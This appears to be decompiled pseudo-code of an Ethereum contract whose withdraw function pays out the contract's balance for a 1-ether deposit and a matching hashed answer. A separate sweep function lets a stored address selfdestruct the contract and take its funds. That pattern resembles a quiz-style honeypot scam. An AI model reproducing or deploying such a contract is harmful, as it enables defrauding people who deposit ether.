contract main {




// =====================  Runtime code  =====================


uint256 stor0;
address stor1;

function sweep() {
    require msg.sender == stor1
    selfdestruct(stor1)
}

function _fallback() payable {
  stop
}

function update(bytes32 arg1) {
    if not stor0:
        stor0 = arg1
}

function setup(string arg1) {
    mem[128 len arg1.length] = arg1[all]
    if not stor0:
        mem[ceil32(arg1.length) + 160 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
        mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 192 len arg1.length % 32] = mem[floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
        mem[arg1.length + ceil32(arg1.length) + 160 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
        mem[(2 * floor32(arg1.length)) + ceil32(arg1.length) + 192 len arg1.length % 32] = mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 192 len arg1.length % 32]
        stor0 = sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[arg1.length + ceil32(arg1.length) + floor32(arg1.length) + 160 len arg1.length % 32])
}

function withdraw(string arg1) payable {
    mem[128 len arg1.length] = arg1[all]
    require msg.sender == tx.origin
    mem[ceil32(arg1.length) + 160 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 192 len arg1.length % 32] = mem[floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
    mem[arg1.length + ceil32(arg1.length) + 160 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[(2 * floor32(arg1.length)) + ceil32(arg1.length) + 192 len arg1.length % 32] = mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 192 len arg1.length % 32]
    if stor0 == sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[arg1.length + ceil32(arg1.length) + floor32(arg1.length) + 160 len arg1.length % 32]):
        if msg.value >= 10^18:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
}



}
